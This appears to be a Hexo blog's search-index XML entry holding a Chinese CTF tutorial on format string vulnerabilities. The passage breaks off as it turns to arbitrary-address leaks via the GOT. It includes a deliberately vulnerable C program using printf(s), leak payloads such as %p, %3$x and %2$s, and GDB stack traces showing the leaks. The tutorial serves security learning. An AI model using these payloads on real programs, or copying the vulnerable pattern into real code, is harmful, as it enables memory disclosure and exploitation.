<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <url>/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><h2 id="基础前备知识"><a href="#基础前备知识" class="headerlink" title="基础前备知识"></a>基础前备知识</h2><h3 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h3><p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C&#x2F;C++ 程序都会利用格式化字符串函数来<strong>输出信息，调试程序，或者处理字符串</strong>。一般来说，格式化字符串在利用的时候主要分为三个部分</p><ul><li>格式化字符串函数</li><li>格式化字符串</li><li>后续参数，<strong>可选</strong></li></ul><h4 id="格式化字符串函数-1"><a href="#格式化字符串函数-1" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h4><p>常见的有格式化字符串函数有</p><ul><li><p>输入</p><ul><li>scanf</li></ul></li><li><p>输出</p><ul><li><table><thead><tr><th>printf</th><th>输出到 stdout</th></tr></thead><tbody><tr><td>fprintf</td><td>输出到指定 FILE 流</td></tr><tr><td>vprintf</td><td>根据参数列表格式化输出到 stdout</td></tr><tr><td>vfprintf</td><td>根据参数列表格式化输出到指定 FILE 流</td></tr><tr><td>sprintf</td><td>输出到字符串</td></tr><tr><td>snprintf</td><td>输出指定字节数到字符串</td></tr><tr><td>vsprintf</td><td>根据参数列表格式化输出到字符串</td></tr><tr><td>vsnprintf</td><td>根据参数列表格式化输出指定字节到字符串</td></tr><tr><td>setproctitle</td><td>设置 argv</td></tr><tr><td>syslog</td><td>输出日志</td></tr><tr><td>err, verr, warn, vwarn 等</td><td>。。。</td></tr></tbody></table></li></ul></li></ul><h4 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h4><p>这里我们了解一下格式化字符串的格式，其基本格式如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">%[parameter][flags][field width][.precision][length]type<br></code></pre></td></tr></table></figure><ul><li>parameter<ul><li>n$，获取格式化字符串中的指定参数</li></ul></li><li>flag</li><li>field width<ul><li>输出的最小宽度</li></ul></li><li>precision<ul><li>输出的最大长度</li></ul></li><li>length，输出的长度<ul><li>hh，输出一个字节</li><li>h，输出一个双字节</li></ul></li><li>type<ul><li>d&#x2F;i，有符号整数</li><li>u，无符号整数</li><li>x&#x2F;X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li><li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li><li>s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li><li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li><li>p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li><li>n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li><li>%， ‘<code>%</code>‘字面值，不接受任何 flags, width。</li></ul></li></ul><h5 id="参数-¶"><a href="#参数-¶" class="headerlink" title="参数 ¶"></a>参数 <a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/#_5">¶</a></h5><p>就是相应的要输出的变量。</p><h3 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h3><p>在一开始，我们就给出格式化字符串的基本介绍，这里再说一些比较细致的内容。我们上面说，格式化字符串函数是根据格式化字符串来进行解析的 。<strong>那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制</strong>。比如说’%s’表明我们会输出一个字符串参数。</p><p><img src="/./../00000000/image-20250428102310437.png" alt="image-20250428102310437"></p><p>对于这样的例子，在进入 printf 函数的之前 (即还没有调用 printf)，栈上的布局由高地址到低地址依次如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">some value<br>3.14<br>123456<br>addr of &quot;red&quot;<br>addr of format string: Color %s...<br></code></pre></td></tr></table></figure><p><strong>注：这里我们假设 3.14 上面的值为某个未知的值。</strong></p><p>在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p><ul><li>当前字符不是 %，直接输出到相应标准输出。</li><li>当前字符是 %， 继续读取下一个字符<ul><li>如果没有字符，报错</li><li>如果下一个字符是 %, 输出 %</li><li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li></ul></li></ul><p>那么假设，此时我们在编写程序时候，写成了下面的样子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);<br></code></pre></td></tr></table></figure><p>此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为</p><ol><li>解析其地址对应的字符串</li><li>解析其内容对应的整形值</li><li>解析其内容对应的浮点值</li></ol><p>对于 2，3 来说倒还无妨，但是对于对于 1 来说，如果提供了一个不可访问地址，比如 0，那么程序就会因此而崩溃。</p><p>这基本就是格式化字符串漏洞的基本原理了。</p><h2 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h2><p>在CTF比赛中，通常利用格式化字符串漏洞来泄露内存和覆盖内存。</p><h3 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h3><p>利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作</p><ul><li>泄露栈内存<ul><li>获取某个变量的值</li><li>获取某个变量对应地址的内存</li></ul></li><li>泄露任意地址内存<ul><li>利用 GOT 表得到 libc 函数地址，进而获取 libc，进而获取其它 libc 函数地址</li><li>盲打，dump 整个程序，获取有用信息。</li></ul></li></ul><h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><p>例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-type">int</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">0x22222222</span>, c = <span class="hljs-number">-1</span>;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>MakeFile:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">leakmemory git:(master) ✗ gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c<br></code></pre></td></tr></table></figure><p>根据 C 语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数 (64 位会根据其传参的规则进行获取)。这里我们主要介绍 32 位。</p><h5 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h5><p>首先，我们可以利用格式化字符串来获取栈上变量的数值。我们可以试一下，运行结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta prompt_">%</span><span class="language-bash">08x.%08x.%08x</span><br>00000001.22222222.ffffffff.%08x.%08x.%08x<br>ffcfc400.000000c2.f765a6bb<br></code></pre></td></tr></table></figure><p>可以看到，我们确实得到了一些内容。为了更加细致的观察，我们利用 GDB 来调试一下，以便于验证我们的想法，这里删除了一些不必要的信息，我们只关注代码段以及栈。</p><p>首先，启动程序，将断点下在 printf 函数处</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ gdb leakmemory<br>gef➤  b printf<br>Breakpoint 1 at 0x8048330<br></code></pre></td></tr></table></figure><p>之后，运行程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">gef➤  r<br>Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br><span class="hljs-meta prompt_">%</span><span class="language-bash">08x.%08x.%08x</span><br></code></pre></td></tr></table></figure><p>此时，程序等待我们的输入，这时我们输入 %08x.%08x.%08x，然后敲击回车，是程序继续运行，可以看出程序首先断在了第一次调用 printf 函数的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Breakpoint 1, __printf (format=0x8048563 &quot;%08x.%08x.%08x.%s\n&quot;) at printf.c:28<br>28  printf.c: 没有那个文件或目录.<br>────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>──────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccec&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccec│+0x00: 0x080484bf  →  &lt;main+84&gt; add esp, 0x20     ← $esp<br>0xffffccf0│+0x04: 0x08048563  →  &quot;%08x.%08x.%08x.%s&quot;<br>0xffffccf4│+0x08: 0x00000001<br>0xffffccf8│+0x0c: 0x22222222<br>0xffffccfc│+0x10: 0xffffffff<br>0xffffcd00│+0x14: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd04│+0x18: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd08│+0x1c: 0x000000c2<br></code></pre></td></tr></table></figure><p>可以看出，此时此时已经进入了 printf 函数中，栈中第一个变量为栈帧指针的返回地址，第二个变量为格式化字符串的地址，第三个变量为 a 的值，第四个变量为 b 的值，第五个变量为 c 的值，第六个变量为我们输入的格式化字符串对应的地址。继续运行程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">gef➤  c<br>Continuing.<br>00000001.22222222.ffffffff.%08x.%08x.%08x<br></code></pre></td></tr></table></figure><p>可以看出，程序确实输出了每一个变量对应的数值，并且断在了下一个 printf 处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Breakpoint 1, __printf (format=0xffffcd10 &quot;%08x.%08x.%08x&quot;) at printf.c:28<br>28  in printf.c<br>───────────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd04│+0x08: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: &quot;%08x.%08x.%08x&quot;   ← $eax<br>0xffffcd14│+0x18: &quot;.%08x.%08x&quot;<br>0xffffcd18│+0x1c: &quot;x.%08x&quot;<br></code></pre></td></tr></table></figure><p>此时，由于格式化字符串为 %x%x%x，所以，程序 会将栈上的 0xffffcd04 及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出。继续运行，我们可以得到如下结果去，确实和想象中的一样。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">gef➤  c<br>Continuing.<br>ffffcd10.000000c2.f7e8b6bb[Inferior 1 (process 57077) exited normally]<br></code></pre></td></tr></table></figure><p>当然，我们也可以使用 %p 来获取数据，如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">%</span><span class="language-bash">p.%p.%p</span><br>00000001.22222222.ffffffff.%p.%p.%p<br>0xfff328c0.0xc2.0xf75c46bb<br></code></pre></td></tr></table></figure><p>这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。</p><p><strong>需要注意的是，我们上面给出的方法，都是依次获得栈中的每个参数，我们有没有办法直接获取栈中被视为第 n+1 个参数的值呢</strong>？肯定是可以的啦。方法如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">%</span><span class="language-bash">n<span class="hljs-variable">$x</span></span><br></code></pre></td></tr></table></figure><p>利用如下的字符串，我们就可以获取到对应的第 n+1 个参数的数值。为什么这里要说是对应第 n+1 个参数呢？这是因为格式化参数里面的 n 指的是该格式化字符串对应的第 n 个输出参数，那相对于输出函数来说，就是第 n+1 个参数了。</p><p>这里我们再次以 gdb 调试一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs assembly">➜  leakmemory git:(master) ✗ gdb leakmemory<br>gef➤  b printf<br>Breakpoint 1 at 0x8048330<br>gef➤  r<br>Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>%3$x<br><br>Breakpoint 1, __printf (format=0x8048563 &quot;%08x.%08x.%08x.%s\n&quot;) at printf.c:28<br>28  printf.c: 没有那个文件或目录.<br><br>─────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>─────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccec&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccec│+0x00: 0x080484bf  →  &lt;main+84&gt; add esp, 0x20     ← $esp<br>0xffffccf0│+0x04: 0x08048563  →  &quot;%08x.%08x.%08x.%s&quot;<br>0xffffccf4│+0x08: 0x00000001<br>0xffffccf8│+0x0c: 0x22222222<br>0xffffccfc│+0x10: 0xffffffff<br>0xffffcd00│+0x14: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd04│+0x18: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd08│+0x1c: 0x000000c2<br>gef➤  c<br>Continuing.<br>00000001.22222222.ffffffff.%3$x<br><br>Breakpoint 1, __printf (format=0xffffcd10 &quot;%3$x&quot;) at printf.c:28<br>28  in printf.c<br>─────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>─────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd04│+0x08: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: &quot;%3$x&quot;     ← $eax<br>0xffffcd14│+0x18: 0xffffce00  →  0x00000001<br>0xffffcd18│+0x1c: 0x000000e0<br>gef➤  c<br>Continuing.<br>f7e8b6bb[Inferior 1 (process 57442) exited normally]<br></code></pre></td></tr></table></figure><p>可以看出，我们确实获得了 printf 的第 4 个参数所对应的值 f7e8b6bb。</p><h5 id="获取栈变量对应的字符串"><a href="#获取栈变量对应的字符串" class="headerlink" title="获取栈变量对应的字符串"></a>获取栈变量对应的字符串</h5><p>此外，我们还可以获得栈变量对应的字符串，这其实就是需要用到 %s 了。这里还是使用上面的程序，进行 gdb 调试，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs assembly">➜  leakmemory git:(master) ✗ gdb leakmemory<br>gef➤  b printf<br>Breakpoint 1 at 0x8048330<br>gef➤  r<br>Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>%s<br><br>Breakpoint 1, __printf (format=0x8048563 &quot;%08x.%08x.%08x.%s\n&quot;) at printf.c:28<br>28  printf.c: 没有那个文件或目录.<br>────────────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccec&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccec│+0x00: 0x080484bf  →  &lt;main+84&gt; add esp, 0x20     ← $esp<br>0xffffccf0│+0x04: 0x08048563  →  &quot;%08x.%08x.%08x.%s&quot;<br>0xffffccf4│+0x08: 0x00000001<br>0xffffccf8│+0x0c: 0x22222222<br>0xffffccfc│+0x10: 0xffffffff<br>0xffffcd00│+0x14: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd04│+0x18: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd08│+0x1c: 0x000000c2<br>gef➤  c<br>Continuing.<br>00000001.22222222.ffffffff.%s<br><br>Breakpoint 1, __printf (format=0xffffcd10 &quot;%s&quot;) at printf.c:28<br>28  in printf.c<br>──────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>──────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd04│+0x08: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: 0xff007325 (&quot;%s&quot;?)     ← $eax<br>0xffffcd14│+0x18: 0xffffce3c  →  0xffffd074  →  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;<br>0xffffcd18│+0x1c: 0x000000e0<br>gef➤  c<br>Continuing.<br>%s[Inferior 1 (process 57488) exited normally]<br></code></pre></td></tr></table></figure><p>可以看出，在第二次执行 printf 函数的时候，确实是将 0xffffcd04 处的变量视为字符串变量，输出了其数值所对应的地址处的字符串。</p><p><strong>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</strong></p><p>此外，我们也可以指定获取栈上第几个参数作为格式化字符串输出，比如我们指定第 printf 的第 3 个参数，如下，此时程序就不能够解析，就崩溃了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta prompt_">%</span><span class="language-bash">2<span class="hljs-variable">$s</span></span><br>00000001.22222222.ffffffff.%2$s<br>[1]    57534 segmentation fault (core dumped)  ./leakmemory<br></code></pre></td></tr></table></figure><p><strong>小技巧总结</strong></p><blockquote><ol><li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li><li>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</li><li>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</li></ol></blockquote><h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>可以看出，在上面无论是泄露栈上连续的变量，还是说泄露指定的变量值，我们都没能完全控制我们所要泄露的变量的地址。这样的泄露固然有用，可是却不够强力有效。有时候，我们可能会想要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 